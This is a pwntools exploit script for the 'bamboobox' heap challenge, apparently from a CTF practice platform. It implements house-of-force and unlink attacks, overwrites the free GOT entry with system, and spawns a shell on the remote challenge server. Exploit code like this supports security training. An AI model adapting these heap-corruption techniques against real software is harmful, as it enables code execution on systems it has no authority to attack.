# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'bamboobox'
islocal = 0
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 25782)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(size,name):
    p.sendlineafter('choice:', '2')
    p.sendlineafter('name:', str(size))
    p.sendafter('item:', name)

def remove(idx):
    p.sendlineafter('choice:', '4')
    p.sendlineafter('item:',str(idx))

def change(idx, name):
    p.sendlineafter('choice:', '3')
    p.sendlineafter('item:', str(idx))
    p.sendlineafter('name:', str(len(name)))
    p.sendafter('item:', name)

def show():
    p.sendlineafter('choice:', '1')

def exit():
    p.sendlineafter('choice:', '5')

def house_of_force():
    
    magic_addr = 0x0400D49

    add(0x30, 'aaaa')
    # debug(0)
    payload  = 'b' * 0x30                           # padding
    payload += 'c' * 0x8 + p64(0xffffffffffffffff)  # fake_prev_size, fake_top_chunk_size
    change(0, payload)
    # debug(0)

    offset = -0x60    # top_chunk_ptr - func_chunk_ptr = 0x60 
    malloc_size = offset - 0x8 -0xf
    add(malloc_size, 'dddd')
    add(0x10, p64(magic_addr) * 2)
    # debug(0)
    exit()
    p.recv()
    p.interactive()

def unlink():
    add(0x40,'a' * 8)
    add(0x80,'b' * 8)
    add(0x80,'c' * 8)
    add(0x20,'/bin/sh\x00')
    #gdb.attach(r)

    ptr=0x6020c8
    fd=ptr-0x18
    bk=ptr-0x10

    fake_chunk=p64(0)
    fake_chunk+=p64(0x41)
    fake_chunk+=p64(fd)
    fake_chunk+=p64(bk)
    fake_chunk+='\x00'*0x20
    fake_chunk+=p64(0x40)
    fake_chunk+=p64(0x90)

    change(0, fake_chunk)
    #gdb.attach(r)

    remove(1)
    free_got=elf.got['free']
    log.info("free_got:%x",free_got)
    payload=p64(0)+p64(0)+p64(0x40)+p64(free_got)
    change(0, payload)
    #gdb.attach(r)

    show()
    free_addr=u64(p.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) 
    log.info("free_addr:%x",free_addr)
    pause()
    libc_base = free_addr - 0x844f0
    log.info("libc_addr:%x",libc_base)

    system_addr=libc_base + 0x45390
    log.info("system_addr:%x",system_addr)

    change(0, p64(system_addr))

    #gdb.attach(r)


    remove(3)
    p.interactive()

if __name__ == '__main__':
    unlink()
